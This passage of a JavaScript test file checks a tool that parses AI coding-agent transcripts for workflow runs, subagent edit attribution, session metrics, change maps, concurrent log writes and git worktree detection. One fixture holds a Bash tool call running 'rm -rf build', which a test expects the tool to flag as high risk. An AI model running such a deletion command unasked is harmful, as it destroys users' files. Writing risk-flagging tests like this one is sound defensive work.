    JSON.stringify({ timestamp: '2026-07-15T12:00:10.000Z', message: { role: 'assistant', id: 'i2', usage: { input_tokens: 10, cache_read_input_tokens: 0, cache_creation_input_tokens: 0, output_tokens: 10 }, content: [{ type: 'tool_use', id: 'ie2', name: 'Edit', input: { file_path: '/x.ts', old_string: 'x\n', new_string: 'x\ny\n' } }] } })
  );
  fs.writeFileSync(
    path.join(wfDir, 'agent-ver1.jsonl'),
    JSON.stringify({ timestamp: '2026-07-15T12:00:20.000Z', message: { role: 'assistant', id: 'v1', usage: { input_tokens: 5, cache_read_input_tokens: 0, cache_creation_input_tokens: 0, output_tokens: 5 }, content: [{ type: 'tool_use', id: 'vr1', name: 'Read', input: { file_path: '/g.ts' } }] } })
  );
  // ver2: two timestamps 5000ms apart → transcript durationMs 5000 (the state entry has NO durationMs → this fallback wins).
  fs.writeFileSync(
    path.join(wfDir, 'agent-ver2.jsonl'),
    [
      { timestamp: '2026-07-15T12:00:30.000Z', message: { role: 'assistant', id: 'v2a', usage: { input_tokens: 7, cache_read_input_tokens: 0, cache_creation_input_tokens: 0, output_tokens: 7 }, content: [{ type: 'tool_use', id: 've1', name: 'Edit', input: { file_path: '/p.ts', old_string: 'p\nq\n', new_string: 'p\nr\n' } }] } },
      { message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 've1', is_error: false }] } },
      { timestamp: '2026-07-15T12:00:35.000Z', message: { role: 'assistant', id: 'v2b', usage: { input_tokens: 3, cache_read_input_tokens: 0, cache_creation_input_tokens: 0, output_tokens: 3 }, content: [{ type: 'text', text: 'checking' }] } },
    ]
      .map((o) => JSON.stringify(o))
      .join('\n')
  );

  const runs = core.parseWorkflows(cwd, S);
  assert.equal(runs.length, 1, 'one workflow run (discovered from the state file / run dir)');
  const w = runs[0];
  assert.equal(w.id, 'wf_rich');
  assert.equal(w.name, 'Editors R2', 'name from the state file workflowName');
  assert.equal(w.description, 'Ship the round-2 editor upgrade across both IDEs', 'description from the state file summary');
  assert.deepEqual(w.phases, ['Implement', 'Verify'], 'phase titles from state.phases[].title');
  assert.equal(w.agentCount, 4);
  assert.equal(w.tokens, 1100, 'run tokens PREFER the state file totalTokens');
  assert.equal(w.durationMs, 45000, 'run durationMs PREFERS the state file (real wall-clock, not a sum of parallel agents)');
  assert.equal(w.edits, 3, 'Σedits from the transcripts = 1 + 1 + 0 + 1');
  assert.equal(w.added, 3, 'Σadded = 1 + 1 + 0 + 1');
  assert.equal(w.removed, 1, 'Σremoved = 0 + 0 + 0 + 1');
  // sparkline: a 20-bin activity histogram summing to one tick per counted assistant turn across all agents
  // (imp1 i1, imp2 i2, ver1 v1, ver2 v2a+v2b = 5) — the same mini-chart shape the fleet rows use.
  assert.equal(Array.isArray(w.sparkline) && w.sparkline.length, 20, 'sparkline is a 20-bin array');
  assert.equal(w.sparkline.reduce((n, x) => n + x, 0), 5, 'sparkline tick total = assistant turns across all agents');
  assert.equal(w.running, true, 'running = status !== completed AND fresh (agent transcripts just written)');
  assert.deepEqual(
    w.phaseGroups,
    [{ title: 'Implement', done: 2, total: 2 }, { title: 'Verify', done: 1, total: 2 }],
    'phaseGroups group agents by REAL phaseTitle, per-phase done/total, in phase order'
  );

  // Regression (0.8.0): a state file that still says status:'running' but whose run has gone STALE (an
  // interrupted/killed run never writes 'completed') must NOT report running — else long-dead runs show
  // "running" forever. Backdate every agent transcript + the state file well past FLEET_ACTIVE_MS.
  const stale = Date.now() / 1000 - 3600; // 1h ago, in seconds (utimesSync takes seconds)
  for (const f of fs.readdirSync(wfDir)) if (f.endsWith('.jsonl')) fs.utimesSync(path.join(wfDir, f), stale, stale);
  fs.utimesSync(path.join(stateDir, 'wf_rich.json'), stale, stale);
  const staleRuns = core.parseWorkflows(cwd, S);
  assert.equal(staleRuns[0].running, false, 'a status:running but long-stale run is NOT reported running (killed/interrupted)');

  const imp1 = w.agents.find((x) => x.agentId === 'imp1');
  assert.equal(imp1.label, 'S11-vscode', 'per-agent label from the state file');
  assert.equal(imp1.phase, 'Implement', 'per-agent phase is the REAL phaseTitle, not a hash');
  assert.equal(imp1.tokens, 500, 'per-agent tokens PREFER the state file (500), not the transcript usage (999)');
  assert.equal(imp1.durationMs, 30000, 'per-agent durationMs PREFERS the state file entry');
  assert.deepEqual([imp1.edits, imp1.added, imp1.removed], [1, 1, 0], 'per-agent edits/±lines from the transcript');
  assert.equal(imp1.done, true, 'state completed → done');
  assert.equal(imp1.agentType, 'workflow-subagent', 'agentType still from the sidecar');

  const ver2 = w.agents.find((x) => x.agentId === 'ver2');
  assert.equal(ver2.label, 'S22-jetbrains');
  assert.equal(ver2.phase, 'Verify');
  assert.equal(ver2.tokens, 100, 'state tokens preferred');
  assert.equal(ver2.durationMs, 5000, 'no state durationMs on this entry → the transcript wall-clock fills in');
  assert.deepEqual([ver2.edits, ver2.added, ver2.removed], [1, 1, 1], 'ver2 edit +1/-1 from the transcript');
  assert.equal(ver2.done, false, 'state running → not done');
});

test('subagents: editId linking attributes a within-window subagent edit, without cross-attributing the main chain (S5, §6)', () => {
  freshHome();
  const S = 'link-window';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const AG = 'agentwindow01';
  const F = path.join(cwd, 'shared.ts');
  const T_MAIN = 1_700_000_000_000; // main edits F first
  const T_SUB = 1_700_000_060_000; // the subagent edits F a minute later — DISJOINT windows
  // main transcript: spawns the subagent + one main-chain Edit on F (at T_MAIN).
  const main = [
    { timestamp: T_MAIN, message: { role: 'assistant', content: [
      { type: 'tool_use', id: 'sp1', name: 'Agent', input: { description: 'edit shared', subagent_type: 'worker' } },
      { type: 'tool_use', id: 'm1', name: 'Edit', input: { file_path: F } },
    ] } },
    { timestamp: T_SUB, toolUseResult: { status: 'completed', agentId: AG },
      message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'sp1', is_error: false }] } },
  ].map((o) => JSON.stringify(o)).join('\n');
  fs.writeFileSync(path.join(proj, S + '.jsonl'), main);
  // subagent transcript: one Edit on the SAME file, inside its own (later) window.
  const subDir = path.join(proj, S, 'subagents');
  fs.mkdirSync(subDir, { recursive: true });
  const subtx = [
    { isSidechain: true, agentId: AG, sessionId: S, timestamp: T_SUB, message: { role: 'assistant', content: [
      { type: 'tool_use', id: 's1', name: 'Edit', input: { file_path: F } },
    ] } },
  ].map((o) => JSON.stringify(o)).join('\n');
  fs.writeFileSync(path.join(subDir, `agent-${AG}.jsonl`), subtx);
  // store: two records for F under the ONE parent session — main's at T_MAIN, the subagent's at T_SUB.
  core.ensureStore(S);
  const b = core.writeBlob(S, Buffer.from('v1\n'));
  const rMain = core.appendLog(S, { ts: T_MAIN, tool: 'Edit', file: F, beforeBlob: null, afterBlob: b, status: 'pending' });
  const rSub = core.appendLog(S, { ts: T_SUB, tool: 'Edit', file: F, beforeBlob: b, afterBlob: core.writeBlob(S, Buffer.from('v2\n')), status: 'pending' });

  // main chain links only the record in its OWN window; never the subagent-window record.
  const acts = core.parseActions(cwd, S);
  const mainEdit = acts.find((a) => a.category === 'edit');
  assert.equal(mainEdit.editId, rMain.id, 'main-chain edit links to the record in its window');
  assert.ok(!acts.some((a) => a.editId === rSub.id), 'main chain never consumes the subagent-window record');

  // the subagent links the within-window record; never the main-chain record (linking is no longer a no-op).
  const subs = core.parseSubagents(cwd, S);
  assert.equal(subs.length, 1, 'one subagent found');
  const subEdit = subs[0].actions.find((a) => a.category === 'edit');
  assert.equal(subEdit.editId, rSub.id, 'subagent edit links to its within-window store record');
  assert.notEqual(subEdit.editId, rMain.id, 'subagent never cross-attributes the main-chain record');
});

test('subagents: interleaved same-file main-chain/subagent edits (overlapping windows) leave BOTH editIds null — never cross-attributed (S5, §6)', () => {
  freshHome();
  const S = 'link-overlap';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const AG = 'agentoverlap01';
  const F = path.join(cwd, 'hot.ts');
  const T1 = 1_700_000_000_000; // main edit #1
  const T2 = 1_700_000_030_000; // subagent edit — BETWEEN the two main edits, so the windows overlap
  const T3 = 1_700_000_060_000; // main edit #2
  const main = [
    { timestamp: T1, message: { role: 'assistant', content: [
      { type: 'tool_use', id: 'sp1', name: 'Agent', input: { description: 'touch hot', subagent_type: 'worker' } },
      { type: 'tool_use', id: 'm1', name: 'Edit', input: { file_path: F } },
    ] } },
    { timestamp: T3, message: { role: 'assistant', content: [
      { type: 'tool_use', id: 'm2', name: 'Edit', input: { file_path: F } },
    ] } },
  ].map((o) => JSON.stringify(o)).join('\n');
  fs.writeFileSync(path.join(proj, S + '.jsonl'), main);
  const subDir = path.join(proj, S, 'subagents');
  fs.mkdirSync(subDir, { recursive: true });
  const subtx = [
    { isSidechain: true, agentId: AG, sessionId: S, timestamp: T2, message: { role: 'assistant', content: [
      { type: 'tool_use', id: 's1', name: 'Edit', input: { file_path: F } },
    ] } },
  ].map((o) => JSON.stringify(o)).join('\n');
  fs.writeFileSync(path.join(subDir, `agent-${AG}.jsonl`), subtx);
  // three store records for F, interleaved main/subagent/main under the one parent session.
  core.ensureStore(S);
  const b0 = core.writeBlob(S, Buffer.from('a\n'));
  const b1 = core.writeBlob(S, Buffer.from('b\n'));
  const b2 = core.writeBlob(S, Buffer.from('c\n'));
  core.appendLog(S, { ts: T1, tool: 'Edit', file: F, beforeBlob: null, afterBlob: b0, status: 'pending' });
  core.appendLog(S, { ts: T2, tool: 'Edit', file: F, beforeBlob: b0, afterBlob: b1, status: 'pending' });
  core.appendLog(S, { ts: T3, tool: 'Edit', file: F, beforeBlob: b1, afterBlob: b2, status: 'pending' });

  // main's window [T1,T3] straddles the subagent's [T2,T2] → cannot partition → every side null.
  const mainEdits = core.parseActions(cwd, S).filter((a) => a.category === 'edit');
  assert.equal(mainEdits.length, 2, 'two interleaved main-chain edits on F');
  assert.ok(mainEdits.every((a) => a.editId === undefined), 'ambiguous overlap → main-chain edits stay unassigned');
  const subEdit = core.parseSubagents(cwd, S)[0].actions.find((a) => a.category === 'edit');
  assert.equal(subEdit.editId, undefined, 'ambiguous overlap → subagent edit stays unassigned (never cross-attributed)');
});

test('fleet: listSiblings lists project sessions with status/pending/files/risk (read-only, path-only) (0.7.0)', () => {
  freshHome();
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const SELF = 'self1', SIB = 'sib1';
  fs.writeFileSync(path.join(proj, SELF + '.jsonl'), JSON.stringify({ message: { role: 'assistant', content: [] } }));
  // sibling ran a destructive Bash command (for the risk flag) — lives in its transcript, not the store.
  fs.writeFileSync(
    path.join(proj, SIB + '.jsonl'),
    JSON.stringify({ timestamp: '2026-07-13T10:00:00.000Z', message: { role: 'assistant', content: [{ type: 'tool_use', id: 'b1', name: 'Bash', input: { command: 'rm -rf build' } }] } })
  );
  const F1 = path.join(cwd, 'a.ts'), F2 = path.join(cwd, 'b.ts');
  seedEdit(SIB, F1, null, 'x\n'); // sibling store edits (both pending)
  seedEdit(SIB, F2, null, 'y\n');

  const list = core.listSiblings(cwd, SELF);
  assert.equal(list.length, 2, 'both project sessions listed');
  const self = list.find((s) => s.id === SELF);
  const sib = list.find((s) => s.id === SIB);
  assert.ok(self.self && !sib.self, 'self flagged; sibling not');
  assert.equal(sib.pending, 2, 'sibling pending count from the store');
  assert.equal(sib.edits, 2);
  assert.ok(sib.files.includes(F1) && sib.files.includes(F2), 'files touched listed');
  assert.ok(sib.risk.total >= 1 && sib.risk.high >= 1, "sibling's rm -rf flagged as high risk");
  assert.ok(sib.active, 'a just-written transcript is active');
  const sum = core.summarizeFleet(list);
  assert.equal(sum.total, 2);
  assert.equal(sum.siblings, 1);
  assert.equal(sum.pending, 2, 'pending counts siblings only (excludes self)');
  const ids = core.projectSessionIds(cwd);
  assert.ok(ids.includes(SELF) && ids.includes(SIB), 'cheap sibling-id enumeration finds both');
});

test('metrics: sessionMetrics rolls up ±lines, actions, subagents, and tool latency (0.7.0)', () => {
  freshHome();
  const S = 'met';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const F = path.join(cwd, 'm.ts');
  seedEdit(S, F, null, 'a\nb\nc\n'); // #1 create: +3
  seedEdit(S, F, 'a\nb\nc\n', 'a\n'); // #2: −2
  const main = [
    { timestamp: '2026-07-13T10:00:00.000Z', message: { role: 'assistant', content: [{ type: 'tool_use', id: 'tu1', name: 'Read', input: { file_path: F } }] } },
    { timestamp: '2026-07-13T10:00:02.000Z', message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'tu1', is_error: false }] } }, // 2s
    { timestamp: '2026-07-13T10:00:10.000Z', message: { role: 'assistant', content: [{ type: 'tool_use', id: 'tu2', name: 'Write', input: { file_path: F } }] } },
    { timestamp: '2026-07-13T10:00:14.000Z', message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'tu2', is_error: false }] } }, // 4s
  ].map((o) => JSON.stringify(o)).join('\n');
  fs.writeFileSync(path.join(proj, S + '.jsonl'), main);

  const m = core.sessionMetrics(cwd, S);
  // DISPLAY units since 0.9.0, like every other count in the product. These two records form a perfect
  // chain (#2 rewrites what #1 produced), so they are ONE thing to review, and its delta is the chain's
  // NET effect — a file created with one line — not the sum of the intermediate steps. Counting the raw
  // records here is what made Stats disagree with the Overview about the same session.
  assert.equal(m.edits.count, 1, 'the chained pair is one review unit');
  assert.equal(m.edits.added, 1, 'and its ±lines are the net effect of the chain');
  assert.equal(m.edits.removed, 0);
  assert.equal(m.edits.pending, 1, 'pending counts review units too — one thing is awaiting a verdict');
  assert.equal(m.actions.total, 2, 'two tool calls in the main transcript');
  assert.equal(m.subagents.count, 0, 'no subagents in this session');
  assert.equal(m.toolLatency.count, 2, 'two measurable tool latencies');
  assert.equal(m.toolLatency.medianMs, 2000, 'median of the 2s/4s gaps');
  assert.equal(m.toolLatency.maxMs, 4000, 'max latency = the 4s gap');
});

test('changemap: rolls edits into per-file/per-module rows + strict task attribution', () => {
  freshHome();
  const S = 'cmap';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });

  const A = path.join(cwd, 'packages', 'core', 'src', 'a.ts');
  const B = path.join(cwd, 'packages', 'core', 'src', 'b.ts');
  const C = path.join(cwd, 'packages', 'core', 'src', 'c.ts');
  const PKG = path.join(cwd, 'packages', 'core', 'pkg.json'); // parent `packages/core` — same label as /src
  const D = path.join(cwd, 'docs', 'x.md');
  const E = path.join(cwd, 'docs', 'y.md');
  fs.mkdirSync(path.dirname(A), { recursive: true });
  fs.mkdirSync(path.dirname(D), { recursive: true });
  fs.writeFileSync(A, 'class Foo {\n  go() {}\n}\n');
  fs.writeFileSync(B, 'p\nq\n');
  fs.writeFileSync(C, 'z\nw\n');
  fs.writeFileSync(PKG, '{\n  "x": 1\n}\n');
  fs.writeFileSync(D, 'hi\nthere\n');
  fs.writeFileSync(E, 'yo\nmore\n');
  const id1 = seedEdit(S, A, null, 'class Foo {\n  go() {}\n}\n'); // #1 ts=1000 create: +3, stays pending
  const id2 = seedEdit(S, B, 'p\n', 'p\nq\n'); // #2 ts=2000: +1
  const id3 = seedEdit(S, D, 'hi\n', 'hi\nthere\n'); // #3 ts=3000: +1
  const id4 = seedEdit(S, C, 'z\n', 'z\nw\n'); // #4 ts=4000: +1
  const id5 = seedEdit(S, PKG, 'a\n', 'a\nb\nc\n'); // #5 ts=5000: +2 (packages/core root, no /src)
  const id6 = seedEdit(S, E, 'yo\n', 'yo\nmore\n'); // #6 ts=6000: +1
  core.setStatus(S, id2, 'kept');
  core.setStatus(S, id3, 'kept');
  core.setStatus(S, id4, 'undone');
  // id1, id5, id6 stay pending

  // Three TodoWrite checkpoints define the in_progress timeline:
  //   [0..3500)  "Scaffold" — the first span is extended back to the session start
  //   [3500..5500) "Ship it"
  //   [5500..∞)  nothing in progress — a genuine gap
  const main = [
    { timestamp: new Date(1500).toISOString(), message: { role: 'assistant', content: [
      { type: 'tool_use', id: 't1', name: 'TodoWrite', input: { todos: [
        { content: 'Scaffold the map', status: 'in_progress' },
        { content: 'Ship it', status: 'pending' }] } }] } },
    { timestamp: new Date(3500).toISOString(), message: { role: 'assistant', content: [
      { type: 'tool_use', id: 't2', name: 'TodoWrite', input: { todos: [
        { content: 'Scaffold the map', status: 'completed' },
        { content: 'Ship it', status: 'in_progress' }] } }] } },
    { timestamp: new Date(5500).toISOString(), message: { role: 'assistant', content: [
      { type: 'tool_use', id: 't3', name: 'TodoWrite', input: { todos: [
        { content: 'Scaffold the map', status: 'completed' },
        { content: 'Ship it', status: 'completed' }] } }] } },
  ].map((o) => JSON.stringify(o)).join('\n');
  fs.writeFileSync(path.join(proj, S + '.jsonl'), main);

  const m = core.buildChangeMap(cwd, S, { root: cwd });

  // --- per-file rollup (churn-desc, ties broken by path so the order is deterministic) ---
  assert.equal(m.files.length, 6, 'one row per touched file');
  assert.deepEqual(m.files.map((f) => f.file), ['a.ts', 'pkg.json', 'x.md', 'y.md', 'b.ts', 'c.ts'], 'churn-desc, then rel');
  const a = m.files[0];
  assert.equal(a.churn, 3, 'churn = added+removed (a 3-line create)');
  assert.equal(a.maxId, id1, 'maxId is the drill-through target — what a click opens');
  assert.equal(a.moduleLabel, 'core', 'core pre-renders the label so no front-end re-derives it');
  assert.deepEqual(a.classes, ['Foo'], 'the edit is attributed to the class it landed in');

  // --- worst-unreviewed-wins status precedence (pending > undone > kept) ---
  assert.equal(a.status, 'pending', 'a pending edit makes its file read pending');
  assert.equal(m.files.find((f) => f.file === 'b.ts').status, 'kept', 'all-kept file reads kept');
  assert.equal(m.files.find((f) => f.file === 'c.ts').status, 'undone', 'undone outranks kept, loses to pending');
  assert.equal(core.fileStatus({ pending: 1, undone: 9 }), 'pending', 'pending outranks undone');
  assert.equal(core.fileStatus({ pending: 0, undone: 1 }), 'undone', 'undone outranks kept');
  assert.equal(core.fileStatus({ pending: 0, undone: 0 }), 'kept', 'nothing outstanding reads kept');

  // --- per-module rollup: buckets group by LABEL, so packages/core/src + packages/core MERGE (0.7.6) ---
  assert.equal(m.modules.length, 2, 'two module labels (core, docs) — NOT one row per raw parent dir');
  assert.equal(m.modules.filter((x) => x.label === 'core').length, 1, 'packages/core/src and packages/core fold into ONE core segment');
  const core_ = m.modules[0];
  assert.equal(core_.label, 'core', 'packages/ prefix and /src suffix stripped');
  assert.equal(core_.module, 'core', 'a module row is identified by its label (module === label)');
  assert.equal(core_.churn, 7, 'core churn sums a.ts(3)+b.ts(1)+c.ts(1)+pkg.json(2)');
  assert.equal(core_.files, 4, 'all four core files (incl. the packages/core root file) roll into one segment');
  assert.equal(core_.status, 'pending', 'a pending descendant makes the module read pending');
  assert.equal(m.modules[1].label, 'docs', 'a root-level dir keeps its own name');
  const sum = (rows) => rows.reduce((n, r) => n + r.churn, 0);
  assert.equal(sum(m.files), sum(m.modules), 'churn is conserved from files up to modules');

  // --- strict per-task attribution: no edge fill, ever ---
  const ch0 = core.taskId('Scaffold the map', 0); // stable content-hash key replaced positional `ch0` (0.8.0 S6)
  const ch1 = core.taskId('Ship it', 0);
  const e1 = m.edits.find((e) => e.id === id1);
  assert.equal(e1.taskId, null, 'strict spans never force-file a pre-first-flip edit onto the head task');
  const e6 = m.edits.find((e) => e.id === id6);
  assert.equal(e6.taskId, null, 'strict spans never widen — a trailing gap edit is unassigned');
  assert.ok(!('subtasks' in m), 'the display-subtask layer is gone (0.8.8) — no subtasks key');
  assert.ok(!('subtask' in m.edits[0]), 'edits carry strict taskId attribution only');

  // --- taskEditIds: the strict review-op set, in capture order ---
  assert.deepEqual(core.taskEditIds(cwd, S, ch0), [id2, id3], 'Scaffold strictly holds edits #2/#3 (never #1)');
  assert.deepEqual(core.taskEditIds(cwd, S, ch1), [id4, id5], 'Ship strictly holds edits #4/#5 (never the trailing #6)');
  assert.equal(typeof m.summary.title, 'string', 'summary.title is the human-readable session name (empty string when unknown)');

  // --- 0.8.0 fix: tasks[] (strict-span identities) unify the taskId space (rollupByTask + tasklog join) ---
  // Regression for the disjoint-id-space defect: subtasks (latest plan) and rollupByTask (strict spans)
  // used to key differently, so tasklog content came up empty. tasks[] is the shared join+label source.
  const shipId = core.taskId('Ship it', 0); // firstSeenTs is not hashed, so 0 matches the real id
  const scaffoldId = core.taskId('Scaffold the map', 0);
  const taskIds = new Set(m.tasks.map((t) => t.taskId));
  assert.ok(taskIds.has(shipId) && taskIds.has(scaffoldId), 'tasks[] holds both strict-span task identities');
  assert.equal(m.tasks.find((t) => t.taskId === shipId).content, 'Ship it', 'tasks[] carries the to-do text — the tasklog/ribbon label');
  const attributed = m.rollupByTask.filter((r) => r.taskId !== null);
  assert.equal(attributed.length, 2, 'edits #2/#3 → Scaffold, #4/#5 → Ship (strict intervals)');
  for (const r of attributed) assert.ok(taskIds.has(r.taskId), `rollupByTask id ${r.taskId} joins tasks[] (unified id space)`);
  assert.equal(m.rollupByTask.find((r) => r.taskId === shipId).edits, 2, 'Ship it rolls up its two strict-span edits');
  assert.ok(m.rollupByTask.some((r) => r.taskId === null), 'the explicit unassigned bucket (edits #1/#6) survives');

  // --- module labels ---
  assert.equal(core.moduleLabel(''), '(root)', 'a root-level file');
  assert.equal(core.moduleLabel('../elsewhere'), '(external)', 'edited outside the workspace');
  assert.equal(core.moduleLabel('packages/vscode/src'), 'vscode', 'monorepo noise stripped');
  assert.equal(core.moduleLabel('packages/vscode'), 'vscode', 'the src-less sibling shares the label (why they merge)');
  assert.equal(core.moduleLabel('test'), 'test', 'an ordinary dir is left alone');
});

// --- S1: single-writer id hazard (§2.7) ---

test('store: concurrent appendLog from separate processes → no duplicate EFFECTIVE ids (S1 in-lock alloc)', async () => {
  const home = freshHome();
  const S = 'concurrent';
  core.ensureStore(S); // storeDir must exist before the child writers open the lock/log
  const DIST = path.resolve(__dirname, '../dist/index.js');
  const N = 8;
  // Each child appends exactly one record for the SAME session, launched in parallel to contend on
  // the append lock. In-lock id allocation (+ read-time reconciliation of any residual unlocked
  // collision) must yield N distinct effective ids and N distinct uids.
  const script =
    `const c=require(${JSON.stringify(DIST)});` +
    `c.appendLog(${JSON.stringify(S)},{ts:Date.now(),tool:'Edit',file:'/w/'+process.argv[1]+'.txt',beforeBlob:null,afterBlob:null,status:'pending'});`;
  const env = { ...process.env, HOME: home, USERPROFILE: home };
  const children = [];
  for (let i = 0; i < N; i++) children.push(cp.spawn(process.execPath, ['-e', script, String(i)], { env }));
  await Promise.all(
    children.map(
      (ch) =>
        new Promise((res, rej) => {
          let err = '';
          ch.stderr.on('data', (d) => (err += d));
          ch.on('error', rej);
          ch.on('exit', (code) => (code === 0 ? res() : rej(new Error(`child exited ${code}: ${err}`))));
        })
    )
  );
  const log = core.readLog(S);
  assert.equal(log.length, N, 'every concurrent writer landed exactly one record');
  assert.equal(new Set(log.map((r) => r.id)).size, N, 'no duplicate EFFECTIVE ids across concurrent writers');
  assert.equal(new Set(log.map((r) => r.uid)).size, N, 'every record carries a distinct uid');
});

test('store: a forced unlocked-append duplicate id is reconciled on read — byId/status/undo stay correct (S1)', () => {
  freshHome();
  const S = 'dup';
  const W = tmpWork();
  const Fa = path.join(W, 'a.txt');
  const Fb = path.join(W, 'b.txt');
  const Fc = path.join(W, 'c.txt');
  fs.writeFileSync(Fa, 'a2\n');
  fs.writeFileSync(Fb, 'b2\n');
  fs.writeFileSync(Fc, 'c2\n');
  const id1 = seedEdit(S, Fa, 'a1\n', 'a2\n'); // 1
  const id2 = seedEdit(S, Fb, 'b1\n', 'b2\n'); // 2
  assert.deepEqual([id1, id2], [1, 2], 'clean serial ids');

  // Simulate the §2.7 residual race: a record hits disk reusing #2's display id for a DIFFERENT file —
  // exactly what two writers that both failed the append lock would produce.
  const bc = core.writeBlob(S, Buffer.from('c1\n'));
  const ac = core.writeBlob(S, Buffer.from('c2\n'));
  fs.appendFileSync(
    core.logPath(S),
    JSON.stringify({ id: 2, uid: 'forced-dup', ts: 9000, tool: 'Edit', file: Fc, beforeBlob: bc, afterBlob: ac, status: 'pending' }) + '\n'
  );

  // readLog reconciles: three distinct records; the LATER duplicate is re-keyed above every raw id.
  const log = core.readLog(S);
  assert.equal(log.length, 3, 'all three records survive');
  assert.equal(new Set(log.map((r) => r.id)).size, 3, 'no duplicate EFFECTIVE ids after reconciliation');
  assert.equal(log.find((r) => r.file === Fc).id, 3, 'the later duplicate was re-keyed to a fresh id above all raw ids');
  assert.equal(log.find((r) => r.file === Fb).id, 2, 'the original #2 kept its display id');
  assert.equal(core.nextId(S), 4, 'nextId counts the re-keyed id, so a new append cannot re-collide');

  // byId + status: a status op on the re-key targets ONLY the re-keyed record, never the original #2.
  core.setStatus(S, 3, 'kept');
  assert.equal(core.findRecord(S, 3).status, 'kept', 're-key #3 flipped');
  assert.equal(core.findRecord(S, 2).status, 'pending', 'original #2 untouched by a status op on the re-key');
  core.setStatus(S, 2, 'undone');
  assert.equal(core.findRecord(S, 2).status, 'undone', 'original #2 flipped independently');
  assert.equal(core.findRecord(S, 3).status, 'kept', 're-key #3 unchanged by the op on #2');

  // undo targeting: undo the re-keyed record → ITS file reverts; the sibling file is untouched.
  const res = core.undoEdit(S, 3);
  assert.ok(res.ok, 'undo #3 succeeded: ' + res.message);
  assert.equal(fs.readFileSync(Fc, 'utf8'), 'c1\n', 'the re-keyed edit reverted its OWN file');
  assert.equal(fs.readFileSync(Fa, 'utf8'), 'a2\n', 'sibling #1 file untouched by undo of the re-key');
  assert.equal(core.findRecord(S, 3).status, 'undone', 'undo marked the re-key undone');
  assert.equal(core.findRecord(S, 2).status, 'undone', 'original #2 remains undone, not double-touched');
});

// --- S2: git-free worktree resolver (session.ts) -----------------------------------------------
// Fixtures are hand-built from git's on-disk formats (verified against real `git worktree add` /
// `git init --bare`), so the tests stay git-free and hermetic — no git binary, no network.

const BARE_FALSE = '[core]\n\tbare = false\n';
const BARE_TRUE = '[core]\n\tbare = true\n';

test('session: repoRoot walks up from a subdir launch to the nearest .git', () => {
  const root = tmpWork();
  fs.mkdirSync(path.join(root, '.git')); // dir-.git (a main working tree)
  const foo = path.join(root, 'packages', 'foo');
  fs.mkdirSync(foo, { recursive: true });
  assert.equal(core.repoRoot(foo), root, 'walks up from packages/foo to the repo root');
  assert.equal(core.repoRoot(root), root, 'at the root itself');
  assert.equal(core.repoRoot(tmpWork()), null, 'no .git anywhere up the tree → null');
});

test('session: commonDir for a main working tree (dir-.git) returns realpath of .git', () => {
  const root = tmpWork();
  const gitDir = path.join(root, '.git');
  fs.mkdirSync(gitDir);
  fs.writeFileSync(path.join(gitDir, 'config'), BARE_FALSE);
  const sub = path.join(root, 'sub', 'deep');
  fs.mkdirSync(sub, { recursive: true });
  const key = fs.realpathSync(gitDir);
  assert.equal(core.commonDir(root), key, 'main tree resolves to realpath(.git)');
  assert.equal(core.commonDir(sub), key, 'subdir launch resolves to the same key');
});

test('session: commonDir resolves a linked worktree (relative commondir) to the shared .git', () => {
  const base = tmpWork();
  const main = path.join(base, 'main');
  const gitDir = path.join(main, '.git');
  const admin = path.join(gitDir, 'worktrees', 'wtA');
  fs.mkdirSync(admin, { recursive: true });
  fs.writeFileSync(path.join(gitDir, 'config'), BARE_FALSE);
  fs.writeFileSync(path.join(admin, 'commondir'), '../..\n'); // relative → resolves to main/.git
  const wt = path.join(base, 'wtA');
  fs.mkdirSync(wt);
  fs.writeFileSync(path.join(wt, '.git'), `gitdir: ${admin}\n`);
  const key = fs.realpathSync(gitDir);
  assert.equal(core.commonDir(wt), key, 'linked worktree resolves to the shared common dir');
  assert.equal(core.commonDir(main), key, 'main tree resolves to the SAME key (siblings group together)');
  const wtsub = path.join(wt, 'packages', 'x');
  fs.mkdirSync(wtsub, { recursive: true });
  assert.equal(core.commonDir(wtsub), key, 'subdir launch inside the worktree still groups');
});

test('session: commonDir handles an absolute commondir (used as-is, not joined against admin dir)', () => {
  const base = tmpWork();
  const shared = path.join(base, 'shared.git');
  fs.mkdirSync(shared, { recursive: true });
  fs.writeFileSync(path.join(shared, 'config'), BARE_FALSE);
  const admin = path.join(base, 'admin', 'wtB'); // admin dir NOT under `shared`, so a wrong join would miss
  fs.mkdirSync(admin, { recursive: true });
  fs.writeFileSync(path.join(admin, 'commondir'), shared + '\n'); // ABSOLUTE common path
  const wt = path.join(base, 'wtB');
  fs.mkdirSync(wt);
  fs.writeFileSync(path.join(wt, '.git'), `gitdir: ${admin}\n`);
  assert.equal(core.commonDir(wt), fs.realpathSync(shared), 'absolute commondir used as-is');
});

test('session: commonDir collapses symlinks via realpath (both sides match)', () => {
  const base = tmpWork();
  const real = path.join(base, 'real');
  const gitDir = path.join(real, '.git');
  fs.mkdirSync(gitDir, { recursive: true });
  fs.writeFileSync(path.join(gitDir, 'config'), BARE_FALSE);
  const link = path.join(base, 'link');
  fs.symlinkSync(real, link); // link → real
  assert.equal(core.commonDir(link), core.commonDir(real), 'symlinked cwd resolves to the same key');
  assert.equal(core.commonDir(link), fs.realpathSync(gitDir), 'key is realpath-collapsed');
});

test('session: commonDir guards the bare-repo edge (returns null)', () => {
  const base = tmpWork();
  const bare = path.join(base, 'bare.git');
  const admin = path.join(bare, 'worktrees', 'wtC');
  fs.mkdirSync(admin, { recursive: true });
  fs.writeFileSync(path.join(bare, 'config'), BARE_TRUE);
  fs.writeFileSync(path.join(admin, 'commondir'), '../..\n'); // → bare dir itself
  const wt = path.join(base, 'wtC');
  fs.mkdirSync(wt);
  fs.writeFileSync(path.join(wt, '.git'), `gitdir: ${admin}\n`);
  assert.equal(core.commonDir(wt), null, 'a worktree whose common dir is bare (config bare=true) → null');
